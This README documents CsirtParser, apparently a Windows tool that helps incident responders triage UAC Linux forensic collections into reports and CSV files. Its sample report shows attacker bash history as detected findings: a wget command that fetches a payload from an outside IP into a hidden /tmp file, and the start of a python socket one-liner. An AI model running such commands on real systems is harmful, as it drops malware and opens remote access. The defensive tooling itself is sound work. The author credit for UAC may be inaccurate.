# CsirtParser

A Windows desktop application for parsing and triaging [UAC (Unix Artefact Collector)](https://github.com/tclahr/uac) forensic collections. Designed for DFIR analysts who need to move quickly from raw collection data to actionable findings.

![CsirtParser UI](docs/screenshot.png)

---

## What it does

CsirtParser ingests UAC `.tar.gz` archives, extracts them, and runs a suite of parsers across the collection. All findings are written to a `QuickWins.txt` / `QuickWins.rtf` report and per-parser normalised CSV files ready for ingestion into a SIEM or timeline tool.

**Parsers included**

| Parser | Source | What it detects |
|---|---|---|
| Auth / Secure | `auth.log`, `secure` | SSH brute-force, root logins, PAM failures, sudo abuse |
| Syslog | `syslog`, `kern.log` | Kernel panics, OOM kills, segfaults, hardware errors, cron executions |
| Messages | `/var/log/messages` | System daemon events, kernel messages |
| Audit | `audit.log` | execve, file access, privilege changes (auditd) |
| Web logs | Apache / Nginx access logs | SQLi, LFI, RCE probes, brute-force by IP |
| Crontab scanner | `/etc/cron*`, `/var/spool/cron` | Attacker-planted persistence in cron job definitions |
| systemd Journal | `user-*.journal` | User-level sudo, SSH, shell execution (binary journal format) |
| Bash history | `.bash_history` | Reverse shells, credential access, droppers, lateral movement, anti-forensics |
| Docker | Container logs and events | Privileged containers, unusual image pulls |
| Live response | UAC live data | Accounts, sudoers, network state, routing |
| Body file | `bodyfile.txt` | Scored file timeline — dropped tools, webshells, staging areas |
| SHA1 hashes | `hash_executables.sha1` | Suspicious executables scored by path, name, and extension |
| Process | `ps aux` snapshot | Processes running from suspicious paths |
| Network | `netstat`, `ss` | Listeners, established connections |
| Persistence | rc.local, systemd units | Boot persistence mechanisms |
| File system | `find`, `stat` output | SUID binaries, recently modified files, world-writable dirs |

---

## Requirements

- Windows 10 / 11
- [.NET 8 Desktop Runtime](https://dotnet.microsoft.com/en-us/download/dotnet/8.0)
- UAC collections (`.tar.gz`, `.tgz`, or pre-extracted)

---

## Case folder structure

CsirtParser expects a specific folder layout:

```
CaseFolder\
├── Upload\          ← drop UAC .tar.gz archives here
│   ├── uac-hostname-2024-11-14.tar.gz
│   └── uac-dbserver-2024-11-14.tar.gz
└── Decompressed\    ← auto-created on scan; or extract here manually
```

Output is written to:

```
CaseFolder\
└── Processed\
    └── uac-hostname-2024-11-14\
        ├── QuickWins.txt          ← main analyst report (plain text)
        ├── QuickWins.rtf          ← formatted report (Word / WordPad)
        ├── Normalized_AUTH.csv    ← normalised log rows, Splunk-ready
        ├── Normalized_SYSLOG.csv
        ├── Normalized_BASH.csv
        ├── Sessions_AUTH.csv      ← SSH session timeline
        ├── SHA1_Candidates.csv    ← scored executable hashes
        └── ProcessedBodyFile.csv  ← body file timeline
```

---

## Quickstart

1. Open CsirtParser
2. On the **Case Setup** tab, set the case name, analyst name, and browse to your case folder
3. Click **Scan** — UAC archives in `Upload\` are extracted automatically
4. On the **Parsers** tab, toggle which parsers to run (all enabled by default)
5. On the **Detection** tab, adjust brute-force thresholds and keyword lists if needed
6. Click **Run** — output appears in `Processed\` and the log pane shows progress
7. Open `QuickWins.rtf` in your case folder to start triage

---

## QuickWins report

The report is structured for fast triage:

```
########## Timeline Coverage ##########
First Log Entry: 2024-11-01 08:12:04 UTC
Last Log Entry:  2024-11-14 03:04:11 UTC

########## [GLOBAL] Summary ##########
[AUTH]    Files: 4  |  First: ...  |  Last: ...  |  Suspicious: 12
  >> [BRUTEFORCE] 185.220.101.47 — 847 failed attempts

[BASH]    Files: 3  |  Suspicious: 9
  >> [HIGH] user=root: wget -O /tmp/.x http://185.220.101.47/elf64

########## [AUTH] Suspicious Findings ##########
  >> [AUTH] [BRUTEFORCE] 185.220.101.47: 847 failed SSH attempts ...

########## [BASH] Suspicious Shell History ##########
  >> [BASH] [HIGH] [2024-11-14 02:17:43 UTC] user=root: wget -O /tmp/.x ...
  >> [BASH] [HIGH] [2024-11-14 02:18:04 UTC] user=root: python3 -c 'import socket...'
  >> [BASH] [LATERAL] [2024-11-14 02:44:37 UTC] user=root SSH→ 10.0.0.12 as deploy
```

Severity levels used throughout:

| Tag | Meaning |
|---|---|
| `[HIGH]` / `[CRITICAL]` | Near-certain attacker activity — review first |
| `[BRUTEFORCE]` | IP exceeded failed-login threshold |
| `[SUSPICIOUS]` | Worth reviewing, not automatically malicious |
| `[LATERAL]` | SSH connection to another internal host |
| `[MEDIUM]` | Informational — provides context |

---

## Detection settings

All thresholds and keyword lists are configurable in the UI without recompiling:

- **Brute-force threshold** — failed logins before an IP is flagged (default: 5)
- **Web RPM threshold** — requests per minute before a web IP is flagged (default: 50)
- **Rank 1 / Rank 2 keywords** — custom terms to escalate findings
- **Whitelist patterns** — paths to suppress from findings
- **Body file settings** — minimum score, recency window, keyword list, whitelist prefixes

---

## Adding a parser

All parsers inherit from `LogFileParser` (in `Helpers/`) and implement `ParseFile(string filePath)`. To add a new parser:

1. Create a class inheriting `LogFileParser` and declare `IAttachNormalizedWriter`
2. Override `ParseLog(...)` with your detection logic
3. Add discovery logic (static `DiscoverFiles(string collectionRoot)`)
4. Add a `ParseXxx` toggle to `ParserConfig.cs`
5. Wire it into `ParserOrchestrator.ProcessLogs(...)` following the pattern of existing parsers
6. Add a card to `ParsersView.xaml`

See `BashHistoryParser.cs` or `CrontabScanner.cs` for complete examples.

---

## Security note

CsirtParser processes artefacts from potentially compromised systems. Run it inside an isolated analysis VM, not on your daily workstation. Do not open untrusted UAC archives on a machine connected to production networks.

---

## Acknowledgements

Built around [UAC (Unix Artefact Collector)](https://github.com/tclahr/uac) by Teo Chua. UAC does the collection — CsirtParser does the analysis.

---

## Licence

MIT — see [LICENSE](LICENSE)
